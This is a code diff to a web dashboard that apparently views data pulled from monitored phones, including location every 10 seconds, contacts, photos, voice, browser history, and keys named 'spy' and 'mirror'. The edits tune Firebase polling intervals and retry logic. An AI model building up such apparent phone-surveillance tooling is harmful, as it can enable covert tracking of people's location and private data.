@@ -2061,8 +2061,8 @@ let playbackLoop = false;
 
 // --- Poll Timers ---
 let pollTimers = [];
-// Sustainable baseline: ~34K reads/day parked, ~42K away (loc 10s) — stays under 50K quota. Before: 146K/day.
-const BASE_INTERVALS = { loc: 10000, hist: 600000, meta: 60000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 900000, logcat: 300000, remote: 60000, photos: 600000, videos: 300000, health: 3600000, mirror: 120000, spy: 60000, files: 840000, appVer: 60000, browser: 300000, activity: 120000, ai: 300000, timeline: 300000, savedWifi: 3600000, queue: 60000, wifi: 300000, nearby: 300000, logcatToggle: 60000, heat: 120000, updatePause: 60000, appSnapshots: 60000, syncToggles: 60000, tuning: 60000 };
+// Sustainable baseline: ~40K reads/day parked with 15s Recents + 2m Timeline (was ~34K with 60s Recents). Under 50K quota. Before throttle: 146K/day.
+const BASE_INTERVALS = { loc: 10000, hist: 120000, meta: 60000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 900000, logcat: 300000, remote: 60000, photos: 600000, videos: 300000, health: 3600000, mirror: 120000, spy: 60000, files: 840000, appVer: 60000, browser: 120000, activity: 120000, ai: 120000, timeline: 120000, savedWifi: 3600000, queue: 60000, wifi: 300000, nearby: 300000, logcatToggle: 60000, heat: 120000, updatePause: 60000, appSnapshots: 15000, syncToggles: 60000, tuning: 60000 };
 let intervals = { ...BASE_INTERVALS };
 
 // --- Init Map ---
@@ -2092,13 +2092,13 @@ function trackRead(count = 1) {
   localStorage.setItem('readBudget', JSON.stringify(readBudget));
   const rbEl = document.getElementById('readBudget');
   if (rbEl) rbEl.textContent = `\u{1F4CA} ${readBudget.count.toLocaleString()}/50K`;
-  // Tiered throttle to stay under 50K quota. Base parked ~34K/day; gentle at 30K, reduced at 40K, critical at 45K.
+  // Tiered throttle to stay under 50K quota. Base parked ~40K/day; gentle at 30K, reduced at 40K, critical at 45K. appSnapshots exempt — stays 15s for accuracy.
   if (readBudget.count > 45000) {
-    intervals = { ...BASE_INTERVALS, loc: 30000, meta: 180000, mirror: 300000, spy: 300000, tuning: 300000, syncToggles: 180000, activity: 600000, appVer: 300000, queue: 180000, heat: 600000, updatePause: 180000, appSnapshots: 300000, remote: 300000, wifi: 600000, nearby: 600000, logcat: 600000, logcatToggle: 300000, videos: 600000, browser: 600000, ai: 600000, timeline: 600000 };
+    intervals = { ...BASE_INTERVALS, loc: 30000, meta: 180000, mirror: 300000, spy: 300000, tuning: 300000, syncToggles: 180000, activity: 600000, appVer: 300000, queue: 180000, heat: 600000, updatePause: 180000, remote: 300000, wifi: 600000, nearby: 600000, logcat: 600000, logcatToggle: 300000, videos: 600000, browser: 600000, ai: 600000, timeline: 600000 };
     if (readBudget.count % 60 === 0) showAlert('Firebase quota critical (' + readBudget.count.toLocaleString() + '/50K) — minimal polling until midnight', 'warn');
     if (rbEl) rbEl.style.color = 'var(--danger)';
   } else if (readBudget.count > 40000) {
-    intervals = { ...BASE_INTERVALS, meta: 120000, mirror: 300000, spy: 120000, tuning: 120000, syncToggles: 120000, activity: 300000, appVer: 120000, queue: 120000, heat: 300000, updatePause: 120000, appSnapshots: 120000, remote: 120000, wifi: 600000, nearby: 600000, logcat: 600000, videos: 600000 };
+    intervals = { ...BASE_INTERVALS, meta: 120000, mirror: 300000, spy: 120000, tuning: 120000, syncToggles: 120000, activity: 300000, appVer: 120000, queue: 120000, heat: 300000, updatePause: 120000, remote: 120000, wifi: 600000, nearby: 600000, logcat: 600000, videos: 600000 };
     if (readBudget.count % 80 === 0) showAlert('Approaching Firebase read limit — reduced poll rate', 'warn');
     if (rbEl) rbEl.style.color = 'var(--warning)';
   } else if (readBudget.count > 30000) {
@@ -3549,10 +3549,18 @@ function fromFirestoreFields(fields) {
 }
 
 async function fetchDevices() {
-  const keys = await fetchRTDB('devices', 'shallow=true');
+  let keys = null;
+  for (let attempt = 0; attempt < 3; attempt++) {
+    keys = await fetchRTDB('devices', 'shallow=true');
+    if (keys && typeof keys === 'object' && Object.keys(keys).length) break;
+    if (attempt < 2) await new Promise(r => setTimeout(r, 1200));
+  }
   if (!keys || typeof keys !== 'object') {
-    document.getElementById('statusDot').textContent = '\u2716 No data';
-    document.getElementById('statusDot').className = 'status warn';
+    // Keep previous devices visible on transient failure (prevents disappear); just retry
+    const hasPrev = document.getElementById('deviceSelect').options.length > 1;
+    document.getElementById('statusDot').textContent = hasPrev ? '\u25CF Live (retrying)' : '\u2716 No data';
+    document.getElementById('statusDot').className = hasPrev ? 'status' : 'status warn';
+    if (!hasPrev) setTimeout(fetchDevices, 4000);
     return;
   }
   devices = {};
@@ -3565,10 +3573,30 @@ async function fetchDevices() {
   }
   const active = [];
   for (const id of ids) {
-    const ts = await fetchRTDB(`devices/${id}/metrics/latest/timestamp`);
-    if (ts) active.push({ id, ts: parseViewerDate(ts) });
+    let tsVal = 0;
+    try {
+      const ts = await fetchRTDB(`devices/${id}/metrics/latest/timestamp`);
+      if (ts) tsVal = parseViewerDate(ts);
+      if (!tsVal) {
+        const info2 = await fetchRTDB(`devices/${id}/info`);
+        if (info2 && info2.lastSyncMs) tsVal = parseInt(info2.lastSyncMs, 10) || 0;
+        else {
+          const m = await fetchRTDB(`devices/${id}/metrics/latest`);
+          if (m) {
+            if (m.ts_ms) tsVal = parseInt(m.ts_ms, 10) || 0;
+            else if (m.timestamp) tsVal = parseViewerDate(m.timestamp);
+          }
+        }
+      }
+    } catch {}
+    // Always keep device visible even if timestamp missing or fetch fails (prevents flicker/disappear)
+    active.push({ id, ts: tsVal || 0 });
   }
   active.sort((a, b) => b.ts - a.ts);
+  if (!active.length && ids.length) {
+    // Fallback: show all ids if somehow none parsed
+    ids.forEach(id => active.push({ id, ts: 0 }));
+  }
   if (!active.length) {
     document.getElementById('statusDot').textContent = '\u2716 No active devices';
     document.getElementById('statusDot').className = 'status warn';
